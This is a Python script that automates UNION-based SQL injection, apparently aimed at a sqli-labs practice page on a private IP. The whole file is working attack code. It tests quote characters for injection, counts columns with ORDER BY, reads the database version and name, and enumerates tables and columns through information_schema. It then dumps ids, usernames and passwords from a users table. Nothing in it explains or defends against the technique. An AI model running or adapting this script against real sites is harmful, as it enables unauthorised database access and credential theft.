import time
from urllib import request
from bs4 import BeautifulSoup


def log(content):
    this_time = time.strftime('%H:%M:%S', time.localtime(time.time()))
    print('[' + str(this_time) + '] ' + content)


def send_request(url):
    log(url)
    res = request.urlopen(url)
    result = str(res.read().decode('utf-8'))
    return result


def can_inject(test_url):
    test_list = ['%22', '%27']
    for item in test_list:
        target_url1 = test_url + str(item) + '%20' + 'and%201=1%20--+'
        target_url2 = test_url + str(item) + '%20' + 'and%201=2%20--+'
        result1 = send_request(target_url1)
        result2 = send_request(target_url2)

        soup1 = BeautifulSoup(result1, 'html.parser')
        fonts1 = soup1.find_all('font')
        content1 = str(fonts1[2].text)

        soup2 = BeautifulSoup(result2, 'html.parser')
        fonts2 = soup2.find_all('font')
        content2 = str(fonts2[2].text)

        if content1.find('Login') != -1 and content2 is None or content2.strip() is '':
            log('Use ' + item + ' -> Exist SQL Injection')
            return True, item
        else:
            log('Use ' + item + ' -> Not Exist SQL Injection')
    return False, None


def test_order_by(url, symbol):
    flag = 0
    for i in range(1, 100):
        log('Order By Test -> ' + str(i))
        test_url = url + symbol + '%20order%20by%20' + str(i) + '--+'
        result = send_request(test_url)
        soup = BeautifulSoup(result, 'html.parser')
        fonts = soup.find_all('font')
        content = str(fonts[2].text)
        if content.find('Login') == -1:
            log('Order By Test Success -> order by ' + str(i))
            flag = i
            break
    return flag


def get_prefix_url(url):
    splits = url.split('=')
    splits.remove(splits[-1])
    prefix_url = ''
    for item in splits:
        prefix_url += str(item)
    return prefix_url


def test_union_select(url, symbol, flag):
    prefix_url = get_prefix_url(url)

    test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

    for i in range(1, flag):
        if i == flag - 1:
            test_url += str(i) + '%20--+'
        else:
            test_url += str(i) + ','
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)
    for i in range(1, flag):
        if content.find(str(i)) != -1:
            temp_list = content.split(str(i))
            return i, temp_list


def exec_function(url, symbol, flag, index, temp_list, function):
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

    for i in range(1, flag):
        if i == index:
            test_url += function + ','
        elif i == flag - 1:
            test_url += str(i) + '%20--+'
        else:
            test_url += str(i) + ','
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)
    return content.split(temp_list[0])[1].split(temp_list[1])[0]


def get_database(url, symbol):
    test_url = url + symbol + 'aaaaaaaaa'
    result = send_request(test_url)
    if result.find('MySQL') != -1:
        return 'MySQL'
    elif result.find('Oracle') != -1:
        return 'Oracle'


def get_tables(url, symbol, flag, index, temp_list):
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

    for i in range(1, flag):
        if i == index:
            test_url += 'group_concat(table_name)' + ','
        elif i == flag - 1:
            test_url += str(i) + '%20from%20information_schema.tables%20where%20table_schema=database()%20--+'
        else:
            test_url += str(i) + ','
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)
    return content.split(temp_list[0])[1].split(temp_list[1])[0]


def get_columns(url, symbol, flag, index, temp_list):
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

    for i in range(1, flag):
        if i == index:
            test_url += 'group_concat(column_name)' + ','
        elif i == flag - 1:
            test_url += str(i) + '%20from%20information_schema.columns%20where%20' \
                                 'table_name=\'users\'%20and%20table_schema=database()%20--+'
        else:
            test_url += str(i) + ','
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)
    return content.split(temp_list[0])[1].split(temp_list[1])[0]


def get_data(url, symbol, flag, index, temp_list):
    prefix_url = get_prefix_url(url)
    test_url = prefix_url + '=0' + symbol + '%20union%20select%20'

    for i in range(1, flag):
        if i == index:
            test_url += 'group_concat(id,0x3a,username,0x3a,password)' + ','
        elif i == flag - 1:
            test_url += str(i) + '%20from%20users%20--+'
        else:
            test_url += str(i) + ','
    result = send_request(test_url)
    soup = BeautifulSoup(result, 'html.parser')
    fonts = soup.find_all('font')
    content = str(fonts[2].text)
    return content.split(temp_list[0])[1].split(temp_list[1])[0].split(',')


def do_sql_inject(url):
    log('Welcome To SQL Injection Tool')
    log('Check For SQL Injection......')
    result, symbol = can_inject(url)
    if not result:
        log('Target Url Not Exist SQL Injection -> Exit')
        return
    else:
        log('Test Order By And Union Select......')
        flag = test_order_by(url, symbol)
        index, temp_list = test_union_select(url, symbol, flag)
        database = get_database(url, symbol)
        version = exec_function(url, symbol, flag, index, temp_list, 'version()')
        this_database = exec_function(url, symbol, flag, index, temp_list, 'database()')
        log('Success -> ' + database.strip() + ' ' + version.strip())
        log('Database -> ' + this_database.strip())
        tables = get_tables(url, symbol, flag, index, temp_list)
        log('Tables -> ' + tables.strip())
        log('Default Use Table users......')
        columns = get_columns(url, symbol, flag, index, temp_list)
        log('Columns -> ' + columns.strip())
        log('Try To Get Data......\n\n')

        datas = get_data(url, symbol, flag, index, temp_list)
        temp = columns.split(',')
        print('%-12s%-12s%-12s' % (temp[0], temp[1], temp[2]))
        for data in datas:
            temp = data.split(':')
            print('%-12s%-12s%-12s' % (temp[0], temp[1], temp[2]))


if __name__ == '__main__':
    do_sql_inject('http://172.16.12.1/sqli/Less-1/index.php?id=1')
